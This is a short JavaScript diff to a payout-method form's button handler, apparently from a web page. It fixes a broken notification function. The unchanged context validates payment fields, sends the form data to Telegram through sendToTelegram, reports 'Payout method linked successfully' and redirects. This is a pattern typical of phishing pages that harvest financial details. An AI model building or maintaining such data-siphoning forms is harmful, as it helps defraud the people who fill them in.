@@ -2436,14 +2436,6 @@ MAIN BUTTON HANDLER
 -------------------------- */
 document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
-  const notification = document.getElementById("planNotification");
-  showNotification(message, duration = 3000) {
-      if (!notification) return;
-      notification.textContent = message;
-      notification.classList.add("show");
-      setTimeout(() => { notification.classList.remove("show"); }, duration);
-  }
-
   // 1. FIRST check validation. If incomplete, stop right here.
   if (!validateCurrentPreference()) {
     showNotification("Please fill out all required fields for your selected payment method", 7000);
@@ -2479,7 +2471,7 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
 
   try {
     await sendToTelegram(data);
-    localShowNotification("Payout method linked successfully", 3000);
+    showNotification("Payout method linked successfully", 3000); // Fixed from localShowNotification
     window.location.href = "/acu-payouts";
   } catch (err) {
     console.error("Telegram send failed:", err);
